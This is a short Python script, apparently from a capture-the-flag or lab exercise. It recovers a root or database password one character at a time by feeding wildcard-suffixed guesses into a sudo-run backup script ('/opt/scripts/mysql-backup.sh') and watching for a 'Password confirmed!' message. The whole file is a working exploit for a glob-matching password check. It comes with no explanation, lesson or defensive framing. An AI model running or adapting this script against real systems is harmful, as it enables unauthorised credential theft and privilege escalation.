import string
import subprocess

pwd = ""
passlib = list(string.ascii_letters + string.digits)

def guess_password(password, passlib):
    if not passlib:
        return password

    for character in passlib:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            return guess_password(password + character, passlib)

    return password
all_characters_and_numbers = string.ascii_letters + string.digits
password = guess_password("", all_characters_and_numbers)
print(password)
